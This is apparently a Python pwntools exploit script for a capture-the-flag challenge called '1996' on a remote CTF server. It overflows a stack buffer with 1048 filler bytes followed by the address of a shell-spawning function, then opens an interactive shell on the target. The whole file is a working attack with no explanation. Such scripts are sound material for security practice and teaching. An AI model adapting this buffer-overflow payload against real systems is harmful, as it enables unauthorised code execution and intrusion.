from pwn import *

#context.arch = 'amd64'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./1996")
p = remote('ctf.j0n9hyun.xyz', 3013)
pop_rdi = 0x400a33
spawn_shell = 0x400897
#gdb.attach(p, 'b*0x04009c9')


print p.recvuntil("Which environment variable do you want to read? ")
payload = ''
payload += "A"*1048
payload += p64(spawn_shell)

p.sendline(payload)
p.interactive()